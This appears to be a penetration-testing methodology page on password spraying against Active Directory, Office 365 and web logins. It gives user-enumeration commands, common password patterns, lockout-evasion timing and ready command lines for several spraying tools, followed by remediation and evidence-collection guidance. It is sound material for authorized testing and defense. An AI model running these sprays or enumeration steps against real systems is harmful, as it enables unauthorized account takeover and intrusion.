# Password Spraying

## Overview
Password spraying is a brute force variant that tests a small number of commonly used passwords against a large number of accounts simultaneously. Unlike traditional brute force, which tries many passwords against one account, spraying distributes attempts across many accounts to stay below lockout thresholds. This technique is highly effective against organizations with weak password policies and is commonly used to attack Active Directory, Office 365, VPN portals, and web applications.

## Classification
- **CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-521 (Weak Password Requirements), CWE-262 (Not Using Password Aging)
- **OWASP:** A07:2021 - Identification and Authentication Failures
- **CVSS Base:** 5.3 - 9.8 (Medium to Critical)
- **MITRE ATT&CK:** T1110.003 (Brute Force: Password Spraying)

## Detection Methodology

### 1. User Enumeration (Pre-Spray)
Gather valid usernames before spraying:
```
Active Directory:
- LDAP queries (if authenticated): ldapsearch -x -H ldap://dc.target.com -b "dc=target,dc=com" "(objectClass=user)" sAMAccountName
- RPC enumeration: rpcclient -U "" target.com -c "enumdomusers"
- Kerberos user enumeration (no auth needed): kerbrute userenum --dc dc.target.com -d target.com userlist.txt
- SMB null session: enum4linux -U target.com
- OSINT: LinkedIn, company directory, email pattern discovery

Office 365 / Azure AD:
- User enumeration via Office 365 API responses
- Azure AD authentication timing differences
- Microsoft Teams user search
- OneDrive URL probing: https://target-my.sharepoint.com/personal/first_last_target_com

Web applications:
- Registration form ("email already exists")
- Password reset form (different response for valid/invalid email)
- API enumeration endpoints
```

### 2. Password Selection Strategy
Choose passwords most likely to succeed:
```
Seasonal / temporal patterns:
- Season + Year: Summer2025!, Winter2025!, Spring2026!
- Month + Year: January2026!, March2026!
- Company + Year: TargetCorp2026!, Target2025!

Common patterns:
- Password1!, Password123, P@ssw0rd, Welcome1!
- Qwerty123!, Letmein1!, Admin123!
- CompanyName1!, CompanyName + current year
- City + number: London2026!, NewYork1!

Default passwords:
- Changeme1!, Temp1234!, Default1!
- NewHire2026!, FirstDay1!

Keyboard patterns:
- Qwer1234!, 1qaz2wsx!, Zaq1@wsx
```

### 3. Lockout Avoidance
```
Critical timing considerations:
1. Determine lockout policy:
   - net accounts /domain (from domain-joined machine)
   - Lockout threshold (usually 3-10 attempts)
   - Lockout observation window (usually 30 minutes)
   - Lockout duration (usually 30 minutes or manual unlock)

2. Spray cadence:
   - Try ONE password across ALL users
   - Wait for the full observation window to reset (e.g., 30+ minutes)
   - Then try the NEXT password across all users
   - Never exceed (threshold - 1) attempts per user per window

3. Smart spraying:
   - Skip accounts already locked out
   - Skip recently created accounts (may have different policies)
   - Skip service accounts with no interactive login
   - Track attempts per user to avoid exceeding threshold
```

## Tool Usage

### SprayHound
```bash
# AD password spraying with BloodHound integration
sprayhound -U users.txt -p 'Summer2026!' -d target.com -dc dc.target.com

# Using NTLM hash
sprayhound -U users.txt -H <ntlm_hash> -d target.com -dc dc.target.com

# Output to BloodHound-compatible format
sprayhound -U users.txt -p 'Password1!' -d target.com -dc dc.target.com --bloodhound
```

### Ruler (Exchange/O365)
```bash
# Autodiscover brute force
ruler -domain target.com brute --users users.txt --passwords passwords.txt

# Single password spray
ruler -domain target.com brute --users users.txt --passwords spray_pass.txt --delay 1800

# Check mailbox access after successful auth
ruler -email user@target.com -password 'Summer2026!' display
```

### o365spray
```bash
# Validate target uses O365
o365spray --validate --domain target.com

# Enumerate valid users
o365spray --enum -U users.txt --domain target.com

# Password spray
o365spray --spray -U valid_users.txt -p 'Summer2026!' --domain target.com

# Spray with delay between passwords (seconds)
o365spray --spray -U valid_users.txt -P passwords.txt --domain target.com --sleep 1800

# Spray with specific count and lockout settings
o365spray --spray -U valid_users.txt -P passwords.txt --domain target.com \
  --count 1 --lockout 30
```

### CrackMapExec (AD/SMB Spraying)
```bash
# SMB password spray
crackmapexec smb dc.target.com -u users.txt -p 'Summer2026!' --continue-on-success

# WinRM spray
crackmapexec winrm target.com -u users.txt -p 'Summer2026!'

# LDAP spray
crackmapexec ldap dc.target.com -u users.txt -p 'Summer2026!'

# MSSQL spray
crackmapexec mssql db.target.com -u users.txt -p 'Summer2026!'

# Using multiple passwords (one per round with manual delay)
crackmapexec smb dc.target.com -u users.txt -p 'Password1!' --continue-on-success
# Wait 30 minutes
crackmapexec smb dc.target.com -u users.txt -p 'Summer2026!' --continue-on-success
```

### Kerbrute (Kerberos-Based Spraying)
```bash
# User enumeration (no lockout risk)
kerbrute userenum --dc dc.target.com -d target.com userlist.txt

# Password spray
kerbrute passwordspray --dc dc.target.com -d target.com users.txt 'Summer2026!'

# Brute force (single user, multiple passwords - use with caution)
kerbrute bruteuser --dc dc.target.com -d target.com passwords.txt admin
```

### DomainPasswordSpray (PowerShell)
```powershell
# Import module
Import-Module .\DomainPasswordSpray.ps1

# Spray with auto user list from AD
Invoke-DomainPasswordSpray -Password 'Summer2026!' -OutFile spray_results.txt

# Spray specific users
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 'Summer2026!' -Domain target.com

# Spray with multiple passwords and delay
Invoke-DomainPasswordSpray -UserList .\users.txt -PasswordList .\passwords.txt -Domain target.com
```

### MSOLSpray (Azure AD)
```powershell
# Office 365 / Azure AD spraying
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\users.txt -Password 'Summer2026!'

# With URL specification
Invoke-MSOLSpray -UserList .\users.txt -Password 'Summer2026!' -URL https://login.microsoftonline.com
```

### TREVORspray (Multi-Protocol)
```bash
# O365 spray with built-in jitter
trevorspray -e users.txt -p 'Summer2026!' --delay 1800

# Using SOCKS proxies for distribution
trevorspray -e users.txt -p 'Summer2026!' --proxy socks5://proxy1:1080 socks5://proxy2:1080

# Spray multiple passwords
trevorspray -e users.txt -p passwords.txt --delay 1800
```

## Post-Compromise Actions
After successful spray:
```
1. Verify access: authenticate with discovered credentials
2. Check email access (OWA, EWS, Graph API)
3. Enumerate group memberships and privileges
4. Look for VPN access, RDP access, or admin portals
5. Check for multi-factor bypass opportunities
6. Identify further pivot points (shared drives, internal apps)
7. Document access level and potential impact
8. DO NOT escalate beyond scope without authorization
```

## Remediation
1. **Enforce strong password policies** -- 14+ characters, block common passwords
2. **Deploy MFA across all accounts** -- especially for external-facing services
3. **Implement smart lockout** (Azure AD) or fine-grained password policies (AD)
4. **Block legacy authentication protocols** -- disable IMAP, POP3, SMTP auth, Basic auth
5. **Monitor for spray patterns** -- many failed logins across accounts from few IPs
6. **Use Azure AD Password Protection** -- custom banned password lists
7. **Implement conditional access policies** -- location, device, risk-based
8. **Enable sign-in risk policies** -- Azure AD Identity Protection
9. **Regular password audits** -- check AD hashes against known breach lists
10. **Deploy honeypot accounts** -- detect spraying with canary credentials

## Evidence Collection
When documenting password spraying findings:
- User enumeration method and number of valid accounts discovered
- Password policy details (complexity, length, lockout threshold, observation window)
- Passwords tested and spray cadence used
- Number and percentage of accounts compromised
- Access level obtained for each compromised account (mail, VPN, admin, etc.)
- MFA status for compromised accounts (enabled, bypassed, or absent)
- Legacy protocol availability that enabled the attack
- Defensive detections triggered (or absence thereof)
- Logs showing attack pattern for SOC correlation
- Recommendations prioritized by risk reduction impact
